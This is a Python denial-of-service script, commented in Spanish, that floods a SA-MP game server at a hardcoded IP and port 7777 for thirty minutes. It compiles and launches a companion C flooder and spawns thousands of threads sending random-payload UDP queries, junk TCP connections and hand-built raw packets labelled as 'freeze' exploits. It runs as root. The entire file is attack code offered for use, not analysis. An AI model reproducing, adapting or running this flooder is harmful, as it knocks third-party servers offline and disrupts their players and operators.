#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Chimera_Core_Apex - El cerebro estratégico del ataque definitivo

import os
import sys
import time
import random
import socket
import subprocess
import threading
import struct
import signal

# --- CONFIGURACIÓN GLOBAL ---
TARGET_IP = "51.161.47.99"  # <-- ¡¡¡CAMBIA ESTO POR LA IP REAL!!!
TARGET_PORT = 7777
ATTACK_DURATION = 1800  # 30 minutos de aniquilación total

# --- VARIABLES GLOBALES DE CONTROL ---
stop_event = threading.Event()

def signal_handler(sig, frame):
    """Manejador para detener el ataque limpiamente con Ctrl+C."""
    print("\n[CHIMERA CORE APEX] Abortando operación por comando del usuario.")
    stop_event.set()
    time.sleep(2)
    print("[CHIMERA CORE APEX] Operación finalizada.")
    sys.exit(0)

# --- FASE DE DESPLIEGUE DE ATAQUE APEX ---
def deploy_apex_attack(target_ip, target_port, duration):
    """Orquesta el lanzamiento del ataque definitivo con todos los módulos."""
    signal.signal(signal.SIGINT, signal_handler)
    print("=" * 80)
    print("     PROYECTO CHIMERA APEX - ECOSISTEMA DE ATAQUE DEFINITIVO")
    print("Este no es un script. Es una plataforma de aniquilación modular.")
    print("=" * 80)
    print(f"Objetivo Final: {target_ip}:{target_port}")
    print(f"Duración: {duration} segundos")
    print("=" * 80)

    threads = []
    beast_process = None

    # --- Despliegue del Módulo Beast Apex (Músculo C Mejorado) ---
    print("[CHIMERA CORE APEX] Desplegando CHIMERA_BEAST_APEX (músculo de bajo nivel mejorado)...")
    try:
        if not os.path.exists("chimera_beast_apex"):
            print("[CHIMERA CORE APEX] Compilando Chimera_Beast_Apex.c...")
            compile_result = subprocess.run(["gcc", "-O3", "-pthread", "chimera_beast_apex.c", "-o", "chimera_beast_apex"], capture_output=True, text=True)
            if compile_result.returncode != 0:
                print(f"[ERROR FATAL] Fallo al compilar Chimera_Beast_Apex.c: {compile_result.stderr}")
                sys.exit(1)
            print("[CHIMERA CORE APEX] Chimera_Beast_Apex compilado con éxito.")
        
        beast_cmd = ["./chimera_beast_apex", str(target_ip), str(target_port), str(duration)]
        beast_process = subprocess.Popen(beast_cmd)
        print("[CHIMERA CORE APEX] Chimera_Beast_Apex está ejecutando el ataque de bajo nivel.")
    except Exception as e:
        print(f"[ERROR] No se pudo desplegar Chimera_Beast_Apex: {e}")

    # --- Despliegue del Módulo Hive Apex (Enjambre de exploits de aplicación) ---
    print("[CHIMERA CORE APEX] Desplegando CHIMERA_HIVE_APEX (enjambre de exploits de aplicación)...")
    # Aumentamos masivamente el número de hilos para cada exploit
    attack_functions = {
        "exploit_query_crash": 2500,      # Aumentado de 800 a 2500
        "exploit_handshake_broken": 4000, # Aumentado de 1200 a 4000
        "exploit_raksamp_freeze": 1500,   # Aumentado de 300 a 1500
    }

    for attack_name, thread_count in attack_functions.items():
        if attack_name == "exploit_query_crash":
            target_function = lambda ip, port, dur, ev: exploit_query_crash(ip, port, dur, ev)
        elif attack_name == "exploit_handshake_broken":
            target_function = lambda ip, port, dur, ev: exploit_handshake_broken(ip, port, dur, ev)
        else: # raksamp_freeze
            target_function = lambda ip, port, dur, ev: exploit_raksamp_freeze(ip, port, dur, ev)

        print(f"[CHIMERA CORE APEX] Lanzando {thread_count} hilos de '{attack_name}'...")
        for i in range(thread_count):
            thread = threading.Thread(target=target_function, args=(target_ip, target_port, duration, stop_event), daemon=True)
            threads.append(thread)
            thread.start()
            # Sin sleep entre hilos para máxima velocidad de despliegue

    print(f"\n[CHIMERA CORE APEX] Todos los módulos desplegados. El objetivo está bajo asalto total.")
    
    # --- Monitor de la Operación ---
    start_time = time.time()
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            time.sleep(15) # Reporte más frecuente
            elapsed = time.time() - start_time
            print(f"[CHIMERA CORE APEX] Tiempo de ataque: {elapsed:.0f}s / {duration}s. Manteniendo presión máxima.")
            if beast_process and beast_process.poll() is not None:
                print("[ADVERTENCIA] El proceso Chimera_Beast_Apex ha terminado prematuramente.")
    finally:
        print("[CHIMERA CORE APEX] Deteniendo todos los módulos...")
        stop_event.set()
        if beast_process:
            beast_process.terminate()
        time.sleep(5)
        print("[CHIMERA CORE APEX] Operación Chimera Apex finalizada.")

# --- Funciones de Explotación (Optimizadas para velocidad) ---
def exploit_query_crash(target_ip, target_port, duration, stop_event):
    start_time = time.time()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 0) # Sin buffer para envío instantáneo
    while not stop_event.is_set() and (time.time() - start_time < duration):
        try:
            query_base = b"SAMP" + bytes.fromhex("".join([f"{int(b):02x}" for b in socket.inet_aton(target_ip)])) + target_port.to_bytes(2, 'big')
            # Payload más grande y más aleatorio
            malicious_payload = os.urandom(random.randint(200, 500))
            full_packet = query_base + malicious_payload
            sock.sendto(full_packet, (target_ip, target_port))
        except Exception:
            pass
    sock.close()

def exploit_handshake_broken(target_ip, target_port, duration, stop_event):
    start_time = time.time()
    while not stop_event.is_set() and (time.time() - start_time < duration):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1) # Timeout mínimo para no bloquear
            # Payload más grande y variado
            sock.send(b"\xFF\xFF\x00" + os.urandom(random.randint(100, 300)))
            sock.close()
        except Exception:
            pass

def exploit_raksamp_freeze(target_ip, target_port, duration, stop_event):
    """Versión mejorada que no usa Scapy para ahorrar recursos y ser más rápida."""
    start_time = time.time()
    try:
        sd = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sd.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 0) # Sin buffer
    except PermissionError:
        print("[ADVERTENCIA] No se pudo crear socket raw para exploit_raksamp_freeze. Necesitas ser root.")
        return

    target_port_struct = struct.pack('!H', target_port)
    while not stop_event.is_set() and (time.time() - start_time < duration):
        try:
            # Payload malicioso más grande
            payload = b'\xC7' + b'!freeze' + os.urandom(400)
            
            # Construir paquete IP + UDP + Payload manualmente
            ip_header = struct.pack('!BBHHHBBH4s', 69, 0, 0, 0, 0, 255, socket.IPPROTO_UDP, 0, socket.inet_aton(target_ip))
            udp_header = struct.pack('!HHHH', random.randint(1024, 65535), target_port, 8 + len(payload), 0)
            
            packet = ip_header + udp_header + payload
            
            sd.sendto(packet, (target_ip, 0))
        except Exception:
            pass
    sd.close()

# --- FUNCIÓN PRINCIPAL ---
def main():
    if os.geteuid() != 0:
        print("[ERROR CRÍTICO] Ejecuta como root (sudo).")
        sys.exit(1)
        
    # Despliegue directo del ataque
    deploy_apex_attack(TARGET_IP, TARGET_PORT, ATTACK_DURATION)

if __name__ == "__main__":
    main()
